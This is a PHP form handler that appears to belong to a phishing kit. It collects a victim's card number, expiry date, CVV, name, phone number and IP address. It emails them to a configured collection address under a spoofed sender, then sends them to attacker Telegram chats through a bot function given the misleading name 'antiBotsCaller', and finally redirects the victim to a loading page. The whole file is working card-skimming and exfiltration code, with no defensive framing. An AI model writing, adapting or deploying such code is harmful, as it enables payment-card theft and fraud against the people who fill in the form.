<?php

require_once "functions.php";
include('config.php');

session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Sanitize and collect form data
    $name = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);
    $card = filter_input(INPUT_POST, 'card', FILTER_SANITIZE_STRING);  // Card number
    $date = filter_input(INPUT_POST, 'date', FILTER_SANITIZE_STRING);
    $cvv = filter_input(INPUT_POST, 'code', FILTER_SANITIZE_STRING);

    // Create the message with the desired style
    $message = '[♾️]  CC [♾️]' . "\r\n\r\n";
    $message .= '💳 Name : ' . $name . "\r\n";
    $message .= '♻️ Card Number : ' . $card . "\r\n";
    $message .= '♾️ Expiry Date : ' . $date . "\r\n";
    $message .= '♾️ CVV : ' . $cvv . "\r\n\r\n";
    $message .= '📱 Phone : ' . $_SESSION['number'] . "\r\n";

    // Add IP address
    $message .= '🛒 IP Address : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";

    // If mail send is true, prepare email
    if($mail_send == true){
        $Subject="「DGT CC | " . $bin . " | " . $_SESSION['bin_bank'] . " | " . $_SERVER['REMOTE_ADDR'];
        $head="From: dgt@rez.cc <info@INUN.bg>";
        
        mail($rezmail,$Subject,$message,$head);
        }
        
        $theip = $message;
       function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
           $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
           $url = $url . "&text=" . urlencode($messaggio);
           $ch = curl_init();
           $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($theip,$antit2,$antic1);antiBotsCaller($message,$bot_token,$rez_chat);
  
  }

    // Redirect to loading page after payment
    header("Location: loading_2.php");
    exit();

?>
